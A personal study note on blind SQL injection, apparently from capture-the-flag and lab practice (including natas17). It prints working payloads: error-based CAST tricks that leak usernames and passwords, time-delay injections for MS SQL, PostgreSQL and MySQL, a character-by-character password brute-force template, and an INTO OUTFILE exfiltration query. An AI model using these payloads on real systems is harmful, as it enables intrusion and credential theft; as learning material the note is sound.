# blind SQLi

at this point there is an SQLi but we can't extract info directly because the
application's http responses don't return the result of SQL quires or database
errors.

Examine:

send payloads to trigger conditional responses and observe the behavior:

  * boolean based:

  injecting test conditions that return either true or false;slowly inferring the
  structure of the database.

  * time based:

  focusing on response time difference of different payloads by triggering a time delay.
  if the delay occurs means the query worked.

  - trigger an out of band network interaction

Exploit:

based on conditional responses: boolean, time delays, errors.

## [[SQLi Blind boolean| boolean based]]


## [[SQLi Blind Error Based| Error based]]

### Extracting sensitive data via verbose SQL error messages

Misconfiguration of the database sometimes results in verbose error messages that can contain useful information.

`CAST((SELECT example_column FROM example_table) AS int)` converts data types, if it's an incompatible type (string -> int) might cause an error, which could be useful to trigger *conditional responses*.

if there is a *character limitation*, you can't use too verbose (long?) queries.

HOW TO:

* commenting helps with eliminating the closing *quotation* that already exist
  in the application's code.

test it:

`' AND CAST((SELECT 1) AS INT) --` returns an error, because it expects a boolean, 1=1 (true)

`' AND 1=CAST((SELECT 1) AS INT) --` is true, so no error returned

`' AND 1=CAST((SELECT "abc") AS INT) --` error, returning `"abc"` because 

`' AND 1=CAST((SELECT username FROM users LIMIT 1) AS INT) --`

remove the cookie because it's not needed and leaves us more characters.

`LIMT 1` so that it doesn't show too many rows.

AND we get an error: invalid input syntax for type integer: "administrator"

so we get the idea to : `' AND 1=CAST((SELECT password FROM users LIMIT 1) AS INT) --`

using this stuff, you can get `version()` and all.


ERROR indicating *character limit*:

Unterminated string literal started at position 95 in SQL SELECT * FROM
tracking WHERE id = 'hyPr13PYPcOYmG05' AND CAST((SELECT password FROM users
where'. Expected  char

## by triggering time delays

in case of a database error, when the SQL query is executed and handles them
gracefully, there won't be any difference in the application's response

but, it is often possible to exploit the blind SQL injection vulnerability by triggering time delays depending on whether an injected condition is true or false.

delaying the execution of a SQL query also delays the http response.

MS SQL:
trigger a delay depending on whether the expression is true:

`'; IF (1=2) WAITFOR DELAY '0:0:10'--
'; IF (1=1) WAITFOR DELAY '0:0:10'--`

Postgres sql:

`' || pg_sleep(10) --`

`||` is to concatenate the function to the query so that the function is called.


to move toward bruteforcing the  password:

`' || (SELECT CASE WHEN (1=1) THEN pg_sleep(10) else pg_sleep(0) END)--`

if true sleep, otherwise don't

you might be able to use `;` instead of `||` to end the previous query and
start a new one.

`("32H3bfd687INjf7b' || (SELECT CASE WHEN (SELECT SUBSTR(password,%d,1) FROM users WHERE username='administrator') = '%c' THEN pg_sleep(10) ELSE pg_sleep(0) END) --", index, c)`
if the first index of the password is `c`, sleep, otherwise return immediately.
this doesn't have to be url encoded.

`'%3bSELECT+CASE+WHEN+(username%3d'administrator'+AND+SUBSTR(password,§1§,1)+%3d+'§a§')++THEN+pg_sleep(10)+else+pg_sleep(0)+END+FROM+users--`
`"32H3bfd687INjf7b' || (SELECT CASE WHEN (SELECT SUBSTR(password,%d,1) FROM users WHERE username='administrator') = '%c' THEN pg_sleep(10) ELSE pg_sleep(0) END) --", index, c`

something like this also works in burpsuite but should be url encoded

### another example, natas17

this is the code, that get a query for `MySQL`:

`$query = "SELECT * from users where username=\"".$_REQUEST["username"]."\"";`

but in the rest of the code, the result isn't returned.

payload:

`natas18" AND IF((1=1),SLEEP(10),'a')#`

the `a` is the else part.

if natas18 is there, response will be delayed.

to get the included characters in the password:
in code: ``username := fmt.Sprintf(`natas18" AND IF(password LIKE BINARY "%%%c%%", SLEEP(10), 1)#`, c)``


% is used for formatting in Go, you need to escape it, which results in the
final query having %c%.
`%c%` in LIKE clause: wild card in SQL, meaning "any sequence of characters".

so it will be like this before sent to the server:
`natas18" AND IF((password LIKE BINARY "%S%"),SLEEP(10),"1")#`

and then to get the actual password, use `SUBSTR`.

## using out-of-band techniques

an app could carry out an SQL query *asynchronously*.

it uses the original thread to process the user's *request* and another to execute the query using the tracking cookie.

the app doesn't wait for the SQL query to return, it's response to user doesn't depend on it, be it an error or the delay.

the query could be vulnerable, but how do we know?

triggering the server to send DNS lookup query to our server.

## exfiltration:

store info somewhere on the local machine:

`SELECT Password FROM Users WHERE Username='admin' INTO OUTFILE '/var/www/html/output.txt'`

then request the file: `https://example.com/output.txt`